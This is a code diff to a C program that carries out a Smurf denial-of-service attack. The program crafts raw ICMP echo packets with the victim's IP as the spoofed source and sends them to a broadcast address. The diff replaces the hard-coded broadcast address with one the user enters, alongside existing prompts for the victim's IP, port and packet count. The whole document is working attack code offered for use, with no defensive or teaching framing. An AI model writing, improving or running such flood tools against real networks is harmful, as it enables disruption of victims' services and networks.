@@ -11,7 +11,7 @@
 #include <linux/icmp.h> 
 #include "utilities.h"
 
-void smurf(char * victimIP, int victimPort, int broadcast, int nPackets){
+void smurf(char * victimIP, int victimPort, char * broadCastIp, int nPackets){
 
 	//initialize random rumber generator
 	time_t t;
@@ -62,14 +62,14 @@ void smurf(char * victimIP, int victimPort, int broadcast, int nPackets){
 	iph -> check = 0;		//Set to 0 before calculating checksum
 	iph -> saddr = inet_addr ( source_ip );	//Spoof the source ip address
 	iph -> check = 0;
-	iph -> daddr = inet_addr("255.255.255.255");
+	iph -> daddr = inet_addr(broadCastIp);
 	iph->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr); 
 	iph->check = csum ((unsigned short *) packet, iph->tot_len);
 
 	int nPacketsSent = 0;
 
 
-	if (broadcast){
+	if (1){
 		//send broadcast icmp echo packets
 		//craft packet
 		//printf('Broadcast : %s\n', inet_ntoa (iph -> daddr));
@@ -108,6 +108,7 @@ void smurf_setup(){
 	while ((getchar()) != '\n'); //clear out buffer
 
 	char victimIp[32];
+	char broadCastIp[32];
 	int victimPort = 0;
 	int broadCast = 1;
 	int nPackets;
@@ -120,12 +121,15 @@ void smurf_setup(){
 	printf ("Enter victim's port : ");
 	scanf ("%d", &victimPort);
 
-	printf ("Use broadcast IP? (1 for yes / 0 for no): ");
-	scanf ("%d", &broadCast);
+	while ((getchar()) != '\n'); //clear out buffer
+	printf ("Enter broadcast address: ");
+	fgets(broadCastIp, 32, stdin);
+	broadCastIp[strcspn(broadCastIp, "\n")] = 0;
+
 
 	printf ("Enter number of packets to send : ");
 	scanf ("%d", &nPackets);
 	//TODO read ip from list instead of using broadcast address
 	broadCast = 1;
-    smurf(victimIp, victimPort, broadCast, nPackets);
+    smurf(victimIp, victimPort, broadCastIp, nPackets);
 }
